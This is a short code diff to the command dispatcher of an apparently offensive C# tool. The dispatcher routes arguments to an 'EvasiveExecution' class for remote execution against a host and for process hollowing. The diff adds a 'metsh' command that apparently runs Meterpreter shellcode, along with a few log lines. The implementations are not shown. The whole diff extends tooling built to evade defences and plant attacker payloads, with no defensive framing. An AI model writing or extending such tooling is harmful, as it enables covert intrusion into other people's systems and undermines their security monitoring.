@@ -25,7 +25,7 @@ namespace Run
             if (arg.Equals("exec"))
             {
                 if (args.Length > 1)
-                    Execution.Func.EvasiveExecution.Prepare(args[1]).Wait();
+                    Execution.Func.EvasiveExecution.Prepare(args[1]);
                 else
                     Console.WriteLine("host needed");
                 return;
@@ -33,7 +33,14 @@ namespace Run
 
             if (arg.Equals("hollow"))
             {
+                Console.WriteLine("Executing proc hollow");
                 Execution.Func.EvasiveExecution.ProcessHollowingExec();
+            }
+
+            if (arg.Equals("metsh"))
+            {
+                Console.WriteLine("Executing met");
+                Execution.Func.EvasiveExecution.MetShc(args[1]);
             }
 
             if (arg.Equals("pipe"))
